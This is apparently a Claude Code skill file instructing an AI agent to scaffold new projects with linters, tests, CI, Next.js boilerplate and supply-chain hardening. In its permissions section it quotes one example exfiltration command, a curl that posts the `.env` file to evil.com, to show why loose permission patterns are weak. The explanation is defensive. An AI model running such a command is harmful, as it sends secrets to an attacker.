---
name: init-project
description: Scaffold a new project in the current directory — git init, README.md, CLAUDE.md, AGENTS.md, Claude settings.json, linter/test config, unused-code detection (knip for TypeScript), runtime pin, supply-chain hardening (SHA-pinned GitHub Actions, least-privilege GITHUB_TOKEN, Dependabot cooldown, pinned container base images), and CI (GitHub Actions + Dependabot) for the specified language (TypeScript, Go, Python), plus optional Next.js boilerplate with error boundaries, security headers, SEO, and a health endpoint. Use this skill when the user wants to initialize or bootstrap a new project from scratch, set up a fresh repo, or scaffold project boilerplate.
allowed-tools: Bash(git init), Bash(git init *), Bash(git status *), Bash(git rev-parse *), Bash(git add *), Bash(git commit -m *), Bash(git ls-remote *), Bash(node -v), Bash(npm -v), Bash(npm view *), Bash(npm install *), Bash(npm run build*), Bash(npm run knip*), Bash(npm run lint*), Bash(npm run test:run*), Bash(npm run typecheck*), Bash(npx biome *), Bash(npx knip*), Bash(go mod init *), Bash(golangci-lint config verify*), Bash(ls*), Bash(tree*), Bash(mkdir *), Bash(ln -s *), Read, Write, Glob, WebFetch(domain:github.com), WebFetch(domain:raw.githubusercontent.com)
---

## Instructions

Initialize a new project in the current directory. Ask the user for:

1. **Project name** — used in README.md heading and CLAUDE.md
2. **One-line description** — what this project does
3. **Primary language** — one of: `typescript`, `go`, `python` (or a framework like `next`, `fastapi`, `gin`, etc.)
4. **Project type** — one of: `public-web` (public, indexable site), `internal-web` (internal tool / dashboard), `api` (backend/HTTP service, no browser UI), or `library`/`cli`. This gates the conditional steps: SEO scaffold (`public-web` only), security headers (any served web UI), and the health endpoint (`api` or any HTTP server).
5. **Service domain(s) and local dev port** — the domain(s) this project serves or calls (e.g. `example.com`, `api.example.com`) and the port the dev server listens on (e.g. `3000`). Used by the service-access permissions in Step 4. Ask only when the project type is not `library`/`cli`; accept "none" and skip that block if the user has no domain yet.

Then scaffold the project following the steps below. Skip any step where the file already exists — never overwrite.

**Never copy a version number or SHA out of this skill.** Anything version-shaped here — `{tag}`, `{sha}`, `{exact current node version}`, `{installed-biome-version}` — is a placeholder to resolve at scaffold time, and any literal version in prose is there to explain a failure, not to be pinned. Resolve the current release yourself (`npm view <pkg> version`, `git ls-remote --tags`, `<tool> --version`), confirm it is problem-free by running the step's verification, and write *that* value into the project. A version baked into this file is only as fresh as the last edit to it; a scaffold that pins it inherits that staleness on day one. The generated project pins hard — exact versions, SHAs, digests — precisely so that the resolving happens here, once, deliberately.

### Step 1: Git

Run `git rev-parse --is-inside-work-tree` to check. If not a git repo, run `git init`.

### Step 2: README.md

Create a minimal README:

```markdown
# {project-name}

{one-line description}
```

### Step 3: CLAUDE.md

Generate a project CLAUDE.md. The structure should be:

```markdown
# Project: {project-name}

{one-line description}

## Context

<!-- Why this project exists, key constraints, target users -->

## Structure

<!-- Will be filled as the project grows -->

## Development

### Setup

### Test

### Lint

### Build

## Implementation Plan

<!-- High-level milestones or phases -->

## Launch Readiness

<!-- Before going public, run /check-production-readiness for a full sweep.
     Not scaffolded here because each needs an account/DSN or app-specific values:
     - Error tracking (e.g. Sentry) on frontend + backend, with source-map upload.
     - Product analytics / metrics.
     - Content-Security-Policy: baseline security headers are scaffolded in next.config; a real
       nonce-based CSP is intentionally left as a TODO until script/style sources are known. -->
```

Fill in the Development section with concrete commands based on the language/framework chosen (e.g., `npm test`, `go test ./...`, `pytest`). Leave Context, Structure, and Implementation Plan as HTML comments for the user to fill in — these require human judgment.

### Step 3.5: AGENTS.md

Create a symlink `AGENTS.md -> CLAUDE.md` so that other AI coding tools (e.g., GitHub Copilot) read the same project instructions:

```bash
ln -s CLAUDE.md AGENTS.md
```

### Step 4: .claude/settings.json

Create `.claude/settings.json` with permissions scoped to the project's language. Use this as the base and add language-specific entries:

```json
{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "permissions": {
    "allow": []
  }
}
```

**Always include** (all languages):
- `Bash(git add *)`, `Bash(git commit -m *)`, `Bash(git diff*)`, `Bash(git log*)`, `Bash(git status*)`

**TypeScript / Node.js** — add:
- `Bash(npm test *)`, `Bash(npm run test*)`, `Bash(npx biome *)`, `Bash(npm run build*)`, `Bash(npm run lint*)`, `Bash(npm run knip*)`, `Bash(npx knip*)`
- `Bash(npx tsc *)` if TypeScript

**Go** — add:
- `Bash(go test *)`, `Bash(go build *)`, `Bash(go vet *)`, `Bash(golangci-lint *)`, `Bash(go mod init *)`

**Python** — add:
- `Bash(pytest *)`, `Bash(ruff *)`, `Bash(ruff check *)`, `Bash(ruff format *)`
- `Bash(pip install *)` if no pyproject.toml build system is obvious

**Service access** — add when the project has a domain or a dev server (skip for `library`/`cli`, and skip the domain entries if the user answered "none" in intake question 5). Substitute the real values from intake; add one `WebFetch`/`curl` pair per domain if there are several:
- `WebFetch(domain:{service-domain})` — lets Claude read the service's own pages without a prompt each time. The `domain:` prefix is required; a bare `WebFetch(example.com)` matches nothing.
- `Bash(curl * {service-domain}*)` — hitting the deployed service.
- `Bash(curl * localhost:{dev-port}*)` — hitting the local dev server.

Example for a Next.js app on `api.example.com` with the dev server on port 3000:

```json
"WebFetch(domain:api.example.com)",
"Bash(curl * api.example.com*)",
"Bash(curl * localhost:3000*)"
```

To cover subdomains, note that `WebFetch(domain:*.example.com)` matches `api.example.com` but **not** the apex `example.com` — list both when the project uses both.

The two `curl` patterns are deliberately loose, and this is a trade-off rather than a boundary. Claude Code matches `Bash(...)` against the whole command string, so `curl * api.example.com*` also allows a command that merely *mentions* the domain after another URL (`curl https://evil.com --data @.env api.example.com`). Tightening it to `Bash(curl -s https://api.example.com/*)` closes that hole but re-prompts whenever a flag is added or reordered — and per the [permissions docs](https://code.claude.com/docs/en/permissions), argument-constraining Bash patterns are fragile in both directions anyway (they miss `-X GET` before the URL, `https` vs `http`, `-L` redirects, and `$URL` variables). Since allowing `Bash` at all already lets Claude reach any URL via `curl`, treat these entries as prompt reduction for local development, not as network access control. If this project handles real secrets, enforce the boundary properly instead: deny `curl`/`wget` and route fetches through `WebFetch`, or validate URLs in a `PreToolUse` hook.

### Step 4.5: package.json and dependencies (TypeScript / Node.js only)

If `package.json` does not exist, create one:

```json
{
  "name": "{project-name}",
  "version": "0.0.0",
  "private": true,
  "type": "module",
  "packageManager": "npm@{current npm version}",
  "engines": {
    "node": "{exact current node version}"
  },
  "scripts": {
    "dev": "next dev --turbopack",
    "build": "next build",
    "start": "next start",
    "lint": "biome check .",
    "lint:fix": "biome check --write .",
    "format": "biome format --write .",
    "typecheck": "tsc --noEmit",
    "knip": "knip",
    "test": "vitest",
    "test:run": "vitest run --passWithNoTests"
  }
}
```

Notes on the template:
- `"type": "module"` — required so `vitest.config.ts` (ESM imports) loads under `verbatimModuleSyntax` in the strict tsconfig added in Step 6.
- `--passWithNoTests` — keeps CI green before any tests exist; remove it once a test suite is in place if you prefer strict failure.

Run `npm -v` and `node -v` to fill in the actual versions.

Adjust `dev`, `build`, and `start` scripts based on the framework:
- **Next.js**: `next dev --turbopack`, `next build`, `next start`
- **Plain TypeScript**: remove `dev`, `build`, `start` or set appropriate commands

Also create `.npmrc` with:

```
save-exact=true
min-release-age=7
ignore-scripts=true
```

- `save-exact=true` — pin dependencies to exact versions (no `^` or `~` prefix)
- `min-release-age=7` — skip package versions published less than 7 days ago
- `ignore-scripts=true` — do not run dependencies' `preinstall`/`install`/`postinstall` scripts

`ignore-scripts` is the one with a real cost, so decide it deliberately rather than inheriting it. Lifecycle scripts are how a compromised package actually executes on a developer machine and in CI — they are the payload path in most recent npm worm incidents, and `min-release-age` only narrows that window rather than closing it. The cost: packages that build a native binary or fetch a platform binary on install (`esbuild`, `sharp`, `puppeteer`, some Prisma setups) break, and the failure is usually a confusing runtime error rather than an install error. Nothing in this scaffold needs install scripts; if a dependency later does, allow it narrowly rather than dropping the flag globally:

```bash
npm rebuild esbuild   # re-run scripts for one package, on purpose
```

Note this also applies in CI (`npm ci` reads the committed `.npmrc`), which is where an unattended postinstall is most dangerous.

Then install dev dependencies. The exact set depends on the framework:

- **Plain TypeScript**: install biome, vitest, typescript, and knip together so the `lint`, `test`, `typecheck`, and `knip` scripts work immediately.

  ```bash
  npm install -D @biomejs/biome vitest typescript knip
  ```

- **Next.js**: install biome and knip here; vitest and typescript are installed alongside the Next.js runtime deps in Step 6.5.

  ```bash
  npm install -D @biomejs/biome knip
  ```

**Go / Python** — skip this step.

### Step 5: Linter config

Set up a minimal linter config for the chosen language.

**TypeScript** — `biome.json`:

First run `npx biome --version` to read the installed CLI version (e.g. `2.4.15`). Pin the `$schema` URL to that exact version — using a stale version like `2.0.0` against a newer CLI produces a deserialize warning on every lint run.

```json
{
  "$schema": "https://biomejs.dev/schemas/{installed-biome-version}/schema.json",
  "linter": {
    "enabled": true
  },
  "formatter": {
    "enabled": true,
    "indentStyle": "space",
    "indentWidth": 2
  }
}
```

For **web / Next.js (JSX)** projects, keep Biome's `recommended` rules on: its accessibility (`a11y`) rules run at error level by default and are the accessibility gate enforced in CI (Step 6.8). Do not disable them — a downgraded a11y rule silently removes that gate.

**Go** — `.golangci.yml`:

```yaml
version: "2"

# `standard` is golangci-lint's default set: errcheck, govet, ineffassign, staticcheck, unused.
# Add more under `enable:` — see https://golangci-lint.run/docs/linters/
linters:
  default: standard
```

The `version: "2"` key is **required**: golangci-lint v2 rejects a config without it (`unsupported version of the configuration`), so a v1-style bare `linters.enable` list fails before any linting runs. `gosimple` and `stylecheck` were merged into `staticcheck` in v2 and are no longer separate linter names — naming them is an error, not a no-op. Verify any edit with `golangci-lint config verify`.

**Python** — `ruff.toml`:

```toml
line-length = 88

[lint]
select = ["E", "F", "I", "W"]
```

### Step 6: Test framework config

Set up a minimal test config. Packages were already installed in Step 4.5 (plain TypeScript) or are installed in Step 6.5 (Next.js); here you only create the config files.

**TypeScript** — `vitest.config.ts`:

```typescript
import { defineConfig } from "vitest/config";

export default defineConfig({
  test: {
    globals: true,
  },
});
```

Also add to `.claude/settings.json`:
- `Bash(npx vitest *)`

**Plain TypeScript only** — also create `tsconfig.json` so `npm run typecheck` runs against a real config instead of `tsc` defaults. Next.js has its own tsconfig generated in Step 6.5; do not create this for Next.js projects.

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "lib": ["ES2022"],
    "strict": true,
    "noImplicitOverride": true,
    "noUncheckedIndexedAccess": true,
    "esModuleInterop": true,
    "forceConsistentCasingInFileNames": true,
    "skipLibCheck": true,
    "resolveJsonModule": true,
    "isolatedModules": true,
    "verbatimModuleSyntax": true,
    "noEmit": true
  },
  "include": ["src/**/*", "vitest.config.ts"],
  "exclude": ["node_modules", "dist"]
}
```

After writing the configs, verify the toolchain end-to-end by running `npm run typecheck`, `npm run lint`, and `npm run test:run` (add `npm run knip` once its config is created in Step 6.4). All should pass on the empty scaffold; if any fails, fix the config before moving on.

**Go** — no config file needed. Go's built-in `go test` works out of the box. Note the test conventions in the CLAUDE.md Development section:

```
### Test

go test ./...
```

**Python** — add pytest config to `pyproject.toml`. If the file does not exist, create it with just the pytest section. If it already exists, append the pytest section.

```toml
[tool.pytest.ini_options]
testpaths = ["tests"]
```

Also create a `tests/` directory with an empty `__init__.py` (Python only).

### Step 6.4: Unused-code detection

Dead files, unused exports, and unused dependencies accumulate silently — they inflate bundles, widen the dependency attack surface, and mislead readers. Wire a detector now so the project never grows a backlog of them.

**TypeScript / Node.js** — [knip](https://knip.dev). The dev dependency and `knip` script were added in Step 4.5. Create `knip.json`:

```json
{
  "$schema": "https://unpkg.com/knip@{installed-knip-major}/schema.json"
}
```

Run `npx knip --version` and use that major in the `$schema` URL, the same way Step 5 pins Biome's schema to the installed CLI.

Knip auto-detects entry points and config through built-in plugins (Next.js, Vitest, Biome, etc.), so the empty `$schema`-only config works out of the box — add `entry`/`project`/`ignore` overrides only when a real false positive appears. Knip requires a recent Node (`npm view knip engines.node`); the runtime pinned in Step 6.6 satisfies it as long as you pinned the current LTS.

For a **library** whose whole point is its public exports, set `package.json` `main`/`exports` to the public entry (or declare `entry` in `knip.json`) so knip treats the public API as used rather than flagging every export — otherwise it will report the library's surface as dead code.

Run `npm run knip` as part of the Step 6 verification. It should report **no issues** on the fresh scaffold (every scaffolded file is either an entry point or reached from one). If it flags a legitimately-unused scaffold export as the project is just starting, prefer adjusting `knip.json` over deleting the file.

**Go** — already covered. The `unused` linter, part of the `standard` set the Step 5 `.golangci.yml` selects, reports unused constants, variables, functions, and types. For whole-program dead-code detection across packages, note `go run golang.org/x/tools/cmd/deadcode@latest ./...` in the CLAUDE.md Development section as an optional deeper pass — it is not added as a hard gate because it needs a real entry point (`main`) to be meaningful.

**Python** — partially covered. The ruff `F` rules already selected in Step 5 catch unused imports (`F401`) and unused local variables (`F841`). Whole unused functions, classes, and methods need a dedicated tool — [vulture](https://github.com/jendrikseipp/vulture). It is **not** wired as a hard gate here because it is prone to false positives on public APIs and dynamically-referenced code (it needs a whitelist to be usable in CI); instead note `vulture .` in the CLAUDE.md Development section as an optional manual pass the maintainer can adopt once the codebase has shape.

### Step 6.5: Next.js boilerplate (Next.js only)

If the chosen framework is Next.js, create the official App Router boilerplate from the `vercel/next.js` template at `packages/create-next-app/templates/app/ts/`.

Fetch it with WebFetch against raw.githubusercontent.com **at the release tag matching the `next` version you are installing**, never from `main`:

```
https://raw.githubusercontent.com/vercel/next.js/v{next-version}/packages/create-next-app/templates/app/ts/{file}
```

Run `npm view next version` to resolve the tag. A `main`/`HEAD` URL is a mutable reference — the same supply-chain hole this skill closes for GitHub Actions in Step 6.8 — and it also drifts out of sync with the pinned `next` release. Read what you fetch before writing it; this step copies third-party code into the project.

Create:

- `next.config.ts` — empty Next.js config
- `tsconfig.json` — TypeScript config with Next.js plugin and `@/*` path alias
- `app/layout.tsx` — root layout with Geist fonts
- `app/page.tsx` — default home page
- `app/globals.css` — global styles
- `app/page.module.css` — page-level CSS module
- `public/` — SVG assets (`file.svg`, `globe.svg`, `next.svg`, `vercel.svg`, `window.svg`)

After creating the files, install the runtime dependencies:

```bash
npm install next react react-dom
npm install -D typescript @types/node @types/react @types/react-dom vitest
```

Install the newest TypeScript this Next.js release actually supports — do not assume `latest` is safe. Next.js declares no `typescript` peer dependency, so npm stays silent on a mismatch and a TypeScript major that Next.js has not adopted yet fails only at build, as an opaque error rather than a version complaint (observed with Next.js 16.2.10 + TypeScript 7.0.2: `next build` dies with `The "id" argument must be of type string. Received undefined`, while the same tree builds on 5.x). The `npm run build` at the end of this step is the check. If it fails, install the newest major that does build (`npm install -D typescript@{major}`) and record the constraint in the CLAUDE.md Development section, so the next person does not helpfully bump it back.

#### Error & loading boundaries

`create-next-app` does not add these; without them a runtime error is a white screen. Create minimal, correct-by-default stubs:

`app/error.tsx`:

```tsx
"use client";

export default function Error({ reset }: { error: Error & { digest?: string }; reset: () => void }) {
  return (
    <div role="alert">
      <h2>Something went wrong</h2>
      <button type="button" onClick={() => reset()}>Try again</button>
    </div>
  );
}
```

`app/global-error.tsx` (catches errors in the root layout; must render its own `<html>`/`<body>`):

```tsx
"use client";

export default function GlobalError({ reset }: { error: Error & { digest?: string }; reset: () => void }) {
  return (
    <html lang="en">
      <body>
        <h2>Something went wrong</h2>
        <button type="button" onClick={() => reset()}>Try again</button>
      </body>
    </html>
  );
}
```

`app/not-found.tsx`:

```tsx
import Link from "next/link";

export default function NotFound() {
  return (
    <div>
      <h2>Not found</h2>
      <Link href="/">Return home</Link>
    </div>
  );
}
```

`app/loading.tsx`:

```tsx
export default function Loading() {
  return <p>Loading…</p>;
}
```

#### Security headers

Add a static baseline header set to `next.config.ts`. **Do not add a Content-Security-Policy here** — a permissive/`unsafe-inline` CSP is a false safeguard; a real nonce-based CSP belongs in middleware once the app's script/style sources are known (left as a TODO in the CLAUDE.md Launch Readiness section). HSTS only takes effect over HTTPS, so it is inert in local dev.

```ts
import type { NextConfig } from "next";

const securityHeaders = [
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "X-Frame-Options", value: "SAMEORIGIN" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
];

const nextConfig: NextConfig = {
  async headers() {
    return [{ source: "/:path*", headers: securityHeaders }];
  },
};

export default nextConfig;
```

#### SEO scaffold — `public-web` only

Skip for `internal-web`, `api`, and `library`/`cli`. For an internal tool, instead consider a `robots.ts` that disallows all crawlers so it is never accidentally indexed.

Replace the default `metadata` export in `app/layout.tsx` (the template already imports `Metadata`) so `metadataBase` and base metadata resolve to the real origin, not the preview/localhost domain:

```ts
export const metadata: Metadata = {
  metadataBase: new URL(process.env.NEXT_PUBLIC_SITE_URL ?? "http://localhost:3000"),
  title: { default: "{project-name}", template: "%s | {project-name}" },
  description: "{one-line description}",
};
```

`app/robots.ts`:

```ts
import type { MetadataRoute } from "next";

const siteUrl = process.env.NEXT_PUBLIC_SITE_URL ?? "http://localhost:3000";

export default function robots(): MetadataRoute.Robots {
  return {
    rules: { userAgent: "*", allow: "/", disallow: "/api/" },
    sitemap: `${siteUrl}/sitemap.xml`,
  };
}
```

`app/sitemap.ts`:

```ts
import type { MetadataRoute } from "next";

const siteUrl = process.env.NEXT_PUBLIC_SITE_URL ?? "http://localhost:3000";

export default function sitemap(): MetadataRoute.Sitemap {
  return [{ url: siteUrl, lastModified: new Date() }];
}
```

The scaffolded code reads `NEXT_PUBLIC_SITE_URL`. Create `.env.example` (or append to it) documenting it — without a real value, canonical/OG/sitemap URLs fall back to `localhost`:

```
NEXT_PUBLIC_SITE_URL=https://example.com
```

Then run `npm run build` to verify the setup works and generate `next-env.d.ts`.

**Other frameworks** — skip this step.

### Step 6.6: Runtime version pinning

Pin the runtime so local, CI, and deploy agree. CI (Step 6.8) reads these files.

**TypeScript / Node** — create `.nvmrc` containing the exact Node version (match `engines.node` from Step 4.5):

```
{exact current node version}
```

**Go** — the `go` directive in `go.mod` pins the toolchain. If `go.mod` does not exist yet, run `go mod init {module-path}` first.

**Python** — create `.python-version` with the target version (e.g. `3.12`); optionally also set `requires-python` in `pyproject.toml`.

### Step 6.7: Health endpoint (conditional)

**Applies when** the project runs an HTTP server or exposes API routes (`api`, or any served web app). Skip for `library`/`cli`. The deploy orchestrator uses it for readiness checks; a trivial 200 is correct-by-default and cheap to add now.

**Next.js (App Router)** — `app/api/health/route.ts`:

```ts
export const dynamic = "force-dynamic";

export function GET() {
  return Response.json({ status: "ok" });
}
```

**Other servers (FastAPI, Gin, etc.)** — init-project does not scaffold server code for these, so add a `GET /healthz` returning `200 {"status":"ok"}` when you create the server, and note the route in the CLAUDE.md Development section.

### Step 6.8: CI & Dependabot (`.github/`)

init-project writes lint/typecheck/test scripts but nothing enforces them. Add a CI workflow that runs the gates on every push and PR, plus Dependabot for updates. Generate only the block matching the chosen language.

`{sha}` and `{tag}` in the templates below are placeholders, not literals — resolve each action's current release and its SHA at scaffold time using the hardening note that follows, and write both in. Never copy a version out of this skill: any tag written here is only as fresh as the last edit to this file.

**`.github/workflows/ci.yml` — TypeScript / Next.js:**

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read # least-privilege GITHUB_TOKEN; escalate per-job only where a step needs write

jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{sha} # {tag}
        with:
          persist-credentials: false
      - uses: actions/setup-node@{sha} # {tag}
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm run typecheck
      - run: npm run knip     # dead-code / unused-dependency gate; relax knip.json if it blocks legit WIP
      - run: npm run test:run
      - run: npm run build   # Next.js only — drop for a plain TS library with no build script
```

**Go:**

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read # least-privilege GITHUB_TOKEN; escalate per-job only where a step needs write

jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{sha} # {tag}
        with:
          persist-credentials: false
      - uses: actions/setup-go@{sha} # {tag}
        with:
          go-version-file: go.mod
      - run: go vet ./...
      - uses: golangci/golangci-lint-action@{sha} # {tag}
        with:
          version: {latest golangci-lint 2.x} # must be a v2 release to match the v2 config from Step 5
      - run: go test ./...
      - run: go build ./...
```

**Python:**

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read # least-privilege GITHUB_TOKEN; escalate per-job only where a step needs write

jobs:
  ci:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@{sha} # {tag}
        with:
          persist-credentials: false
      - uses: actions/setup-python@{sha} # {tag}
        with:
          python-version-file: .python-version
      - run: pip install ruff pytest
      - run: ruff check .
      - run: ruff format --check .
      # pytest exits 5 when it collects no tests, which would fail CI on the fresh scaffold.
      # This is the Python counterpart of vitest's --passWithNoTests; drop `|| [ $? -eq 5 ]`
      # once a real suite exists so that a silent collection failure fails CI again.
      # A genuine test failure still exits 1 and fails the step.
      - run: pytest || [ $? -eq 5 ]
```

**Supply-chain hardening of the workflow.** The templates above bake in three controls; apply the SHA-pinning step before you commit:

- **Least-privilege `GITHUB_TOKEN`** — the top-level `permissions: contents: read` block means a compromised action can't push, open PRs, or edit issues by default. Add a narrower `permissions:` to a single job only when a step genuinely needs write.
- **`persist-credentials: false`** on `actions/checkout` — stops the token being written to `.git/config`, where a later step or a built artifact/image could exfiltrate it. Drop it only if a subsequent step must push with the checkout token.
- **Pin every `uses:` to a full 40-char commit SHA, not a tag.** Tags are mutable — the tj-actions/changed-files compromise (2025) re-pointed a tag and hit tens of thousands of repos.

  Resolve the values yourself; the templates above deliberately carry `{sha}`/`{tag}` placeholders rather than real versions. For each action, find the current release, then resolve that tag to its SHA:

  ```bash
  # current release tag (WebFetch https://github.com/{owner}/{repo}/releases/latest also works)
  git ls-remote --tags --sort=-v:refname https://github.com/actions/checkout | head -5

  # the SHA that tag points to
  git ls-remote https://github.com/actions/checkout {tag}
  ```

  Write the SHA in and keep the tag as a trailing comment, so humans and Dependabot can still read it:

  ```yaml
  - uses: actions/checkout@{resolved 40-char sha} # {resolved tag}
  ```

  Do this for `actions/checkout`, `actions/setup-node`/`setup-go`/`setup-python`, `golangci/golangci-lint-action`, and any other third-party action. The `github-actions` Dependabot block below then bumps both the SHA and the comment as new releases land, so pinning doesn't rot into a stale (possibly vulnerable) version.

**`.github/dependabot.yml`** — set `package-ecosystem` to `npm` / `gomod` / `pip` for the project language; the `github-actions` block keeps the (SHA-pinned) workflow actions current. `cooldown` mirrors the `.npmrc` `min-release-age` gate so Dependabot doesn't open a PR onto a just-published — possibly hijacked — version. Grouping keeps PR noise down:

```yaml
version: 2
updates:
  - package-ecosystem: "npm" # gomod | pip — match the project language
    directory: "/"
    schedule:
      interval: "weekly"
    cooldown:
      default-days: 7 # hold back freshly-published versions (mirrors .npmrc min-release-age)
    groups:
      all-dependencies:
        patterns: ["*"]
  - package-ecosystem: "github-actions" # keeps SHA pins current; cooldown is NOT supported for this ecosystem
    directory: "/"
    schedule:
      interval: "weekly"
  # Add this block ONLY if the project ships a Dockerfile (Step 6.9) — keeps the pinned base-image digest fresh:
  # - package-ecosystem: "docker"
  #   directory: "/"
  #   schedule:
  #     interval: "weekly"
  #   cooldown:
  #     default-days: 7
```

### Step 6.9: Container image pinning (only if the project ships a Dockerfile)

init-project does not scaffold a Dockerfile. But if this project deploys as a container and you (or the user) add one, pin its supply chain the same way the workflow is pinned — an unpinned base image is a mutable dependency pulled on every build:

- **Pin the base image by tag *and* digest.** A bare tag (`FROM node:22`) is re-pushable; the `@sha256:` digest is the immutable, verifiable reference:

  ```dockerfile
  FROM node:{current tag}@sha256:{resolved digest}
  ```

  Resolve the current tag and its digest at the time you write the Dockerfile — `docker buildx imagetools inspect node:{tag}` prints the digest. Keep the human-readable tag in front so Dependabot's `docker` ecosystem (uncomment the block in Step 6.8) can bump both tag and digest as new releases land — otherwise the pin rots into a stale, possibly-vulnerable image.
- **Pin OS packages** to explicit versions (`apt-get install -y curl={version}`, resolved against the base image's distro), add `--no-install-recommends`, and clean the apt lists in the same layer.
- **Install app deps from the lockfile only** — `npm ci`, never `npm install`. `npm ci` fails on a lockfile mismatch and honors the `.npmrc` (`save-exact`, `min-release-age`) from Step 4.5.
- **Run as a non-root `USER`** and copy only what the build needs (use `.dockerignore`) to shrink the attack surface.

### Step 7: .gitignore

If `.gitignore` does not exist, create one with sensible defaults for the language:

**TypeScript**: `node_modules/`, `dist/`, `*.tsbuildinfo`
**Next.js** (in addition to TypeScript): `.next/`, `out/`
**Go**: binary name (project name), `vendor/` (optional)
**Python**: `__pycache__/`, `*.pyc`, `.venv/`, `dist/`, `*.egg-info/`

Always include: `.DS_Store`, `tmp/`, and the env block below (every language — a `.env` shows up as soon as the project has one secret):

```
.env*
!.env.example
```

Ignore `.env*` wholesale rather than only `.env*.local`. Step 6.5 scaffolds `.env.example` and tells the user to put real values in `.env`, so an ignore rule matching only `*.local` leaves the one file that actually holds secrets tracked — that is how a `.env` reaches a commit. The `!.env.example` negation keeps the committed template visible.

### Step 8: Summary

After scaffolding, run `tree -a -I '.git' --dirsfirst` and show the user what was created. List any files that were skipped because they already existed.

### Step 9: Initial commit

Stage all created files and make an initial commit:

```bash
git add <all created files>
git commit -m "chore: scaffold project with initial config"
```

Only commit the files that were created by this skill. Do not use `git add .` or `git add -A`.
